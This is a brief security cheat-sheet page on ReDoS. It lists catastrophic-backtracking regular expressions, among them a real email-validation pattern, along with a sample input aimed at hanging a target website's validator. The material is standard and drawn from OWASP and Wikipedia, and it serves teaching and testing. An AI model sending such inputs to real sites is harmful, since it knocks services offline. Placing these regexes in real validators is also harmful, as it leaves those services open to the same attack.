---
title: ReDoS (Regular Expression Denial of Service)
description: ReDOS is an attack method to compromise the Regex vulnerabilities which evaluate arbitrary inputs.
tags:
    - Network
refs:
    - https://en.wikipedia.org/wiki/ReDoS#Examples
    - https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS
date: 2023-10-12
draft: false
---

## Evil (Vulnerable) Regex

```html
(a+)+
([a-zA-Z]+)*
(a|aa)+
(a|a?)+
(.*a){x} for x \> 10
^(([a-z])+.)+[A-Z]([a-z])+$

<!-- https://regexlib.com/REDetails.aspx?regexp_id=1757&AspxAutoDetectCookieSupport=1 -->
/^([a-zA-Z0-9])(([\-.]|[_]+)?([a-zA-Z0-9]+))*(@){1}[a-z0-9]+[.]{1}(([a-z]{2,3})|([a-z]{2,3}[.]{1}[a-z]{2,3}))$/
```

<br />

## Malicious Input

If a target website validates user input with the above vulnerable Regex, we may be able to compromise the target system by the following malicious input:

```bash
aaaaaaaaaaaaaaaaaaaaaaaa!
```
